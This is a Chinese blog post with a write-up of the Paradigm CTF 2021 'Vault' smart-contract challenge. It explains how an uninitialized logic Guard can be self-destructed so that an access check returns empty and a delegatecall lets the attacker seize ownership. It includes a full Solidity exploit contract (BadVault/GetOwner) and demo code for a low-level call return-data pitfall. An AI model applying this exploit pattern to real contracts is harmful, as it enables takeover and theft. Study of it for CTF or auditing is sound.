---
layout: post
title:  "Paradigm 2021 Vault题解"
date:   2021-07-19 11:07:32 +0800
categories: paradigm
---
### 分析
1. Vault引入了eip-1167标准，查阅发现是一个所谓的“Create Clone”，提供了对Proxy合约的克隆，使其指向Logic合约并通过delegatecall完成实际调用，从实际例子出发，这里```function createClone(address target) internal returns (address result)```将创建一个只会delegatecall target的合约并返回其地址
2. 要更改Vault的owner，转了一圈发现一个可疑点

```solidity
function emergencyCall(address target, bytes memory data) public {
   require(checkAccess("emergencyCall"));        
    require(target.delegatecall(data));
}
```
允许任意代码执行，但前提条件是guard开了emergencyCall
3. 思路有两种，替换掉guard为自己的，或给guard加可执行命令，但没有找到能执行这两类操作的入口
4. 仔细观察checkAccess函数，NO_ERROR是0值，而当一个合约为空，任何调用返回值都是0(**错误，低级CALL在没有返回值的情况下不会复制，这里有大坑，下边讲**)，```guard.isAllowed```实际delegatecall了Logic Guard的isAllowed，销毁Logic Guard就能让该函数返回空即0
5. 由于Logic Guard没有执行过initiate函数，可以构造一个恶意的vault绑定到Logic Guard，然后从恶意vault调用Logic Guard的cleanup即可

### 解题

```solidity
pragma solidity ^0.4.16;

contract Guard {
    function initialize(address) external;
    function cleanup() external;
    function owner() external returns(address);
}

contract Vault {
    function emergencyCall(address target, bytes memory data) public;
}

contract BadVault {
    Guard public guard = Guard(0x880081bE260A28f24616fD437545045d94F792cc);
    Vault public vault = Vault(0xf084baFb620A0af4e6F27093592DdC5FC585EbE6);
    address public owner = 0x233333F494990E8BBa9143a1964C3d91597eee81;
    GetOwner public getowner;
    
    function pwn1() public {
        // stage 1
        guard.initialize(address(this));
        require(guard.owner() == owner, "bad owner!!!!");
        guard.cleanup();
    }
    function pwn2() public {
        // stage 2
        getowner = new GetOwner();
        vault.emergencyCall(address(getowner), hex"");
    }
}

contract GetOwner {
    address public owner;
    
    function() external payable {
        owner = 0x233333F494990E8BBa9143a1964C3d91597eee81;
    }
}
```

### 大坑
1. 这里emergencyCall一直爆炸，搜了题解发现合约为空的时候返回值没有被设定，依然保留原有memory，（solidity 版本 0.4.16）
2. 如果是纯手搓汇编，低级CALL的返回值到底有多长是由
    a. ```gas addr argsOffset argsLength retOffset retLength```中的retLength
    b. 被调用合约的返回值长度
联合决定的，测试数据如下

```solidity
pragma solidity 0.5.10;

interface IFetcher {
    function fetch(bytes32) external view returns (bytes32);
}

contract Vulnerable {
    function getNumber(IFetcher f, bytes32 what) external view returns (bytes32) {
        bytes32 selector = f.fetch.selector;

        bytes32 ret;
        bool success;

        assembly {
            let ptr := mload(0x40)     // get free memory pointer
            mstore(0x40, add(ptr, 32)) // allocate 32 bytes
            mstore(ptr, selector)      // write the selector there
            mstore(add(ptr, 0x4), what)// write the args
            success := staticcall(
                gas,                   // forward all gas
                f,                     // target
                ptr,                   // start of call data
                4,                     // call data length
                ptr,                   // where to write return data
                20                     // length of return data
            )
            ret := mload(ptr)          // copy return data into ret
        }

        require(success, "Call failed.");

        return ret;
    }
}

contract F1 {
    function() external {
        assembly {
            mstore(0, 0xbbbb000000000000000000000000000000000000000000000000000000000000)
            return(0, 2)
        }
    }
}

contract F2 {
    function() external {
        assembly {
            mstore(0, 0xcccc000000000000000000000000000000000000000000000000000000000000)
            return(0, 0)
        }
    }
}

contract F3 {
    function() external {
        assembly {
            mstore(0, 0xdddd00000000000000000000000000000000000000000000000000000000dead)
            return(0, 32)
        }
    }
}
```
在这个例子中，ptr一开始指向参数，然后被设定为返回值的memory起始地址，注意我们把retLength设成了20而不是32，

当传入一个空合约地址时，返回值长度为0，没有覆盖任何东西
![b1a5ec7257e5e0e0b1e205a19bfd51c2.png](evernotecid://D741C029-3454-4F77-8374-68A1A648E79F/appyinxiangcom/30777634/ENResource/p448)

当传入F1时，返回值长度为2，覆盖了前2个字节
![0d7bbbc0078f7272099e4b3f3e0915e4.png](evernotecid://D741C029-3454-4F77-8374-68A1A648E79F/appyinxiangcom/30777634/ENResource/p449)

当传入F2时，返回值长度为0，没有覆盖任何东西
![05e8abaad5e40921ecc97f4f87970816.png](evernotecid://D741C029-3454-4F77-8374-68A1A648E79F/appyinxiangcom/30777634/ENResource/p450)

当传入F3时，返回值长度为20，虽然F3试图返回32，但retLength被限定了20，覆盖了前20个字节
![a3719adacd7a71fafbc96c833b2c770a.png](evernotecid://D741C029-3454-4F77-8374-68A1A648E79F/appyinxiangcom/30777634/ENResource/p451)

如果您不需要编写手动优化的程序集，到目前为止最好的方法是利用 Solidity 的高级语法进行合约调用：

```
contract SafeSolidity {
    function getNumber(IFetcher f) external view returns (uint256) {
        return f.fetch();
    }
}
```
从 Solidity 0.4.22 开始，编译器生成字节码，显式检查返回数据的大小，如果返回的数据不足，则revert。如果您将 EOA（用户地址） 传递给SafeSolidity合约，则调用将revert，这里经过测试其逻辑

等价于

```
if(!address(f).code.length) {
    revert(0, 0)
}
success := staticcall(..., f, ...)
if lt(returndatasize, retLength) { // 长了可以短了不行
    revert(0, 0)
}
```

编译器甚至多了一个地址检查（对于没有返回值的函数），如下function经过反编译的结果如图

```
function isEOA(address who) public view returns(bool) {
    IFetcher(who).test();
    return true;
}
```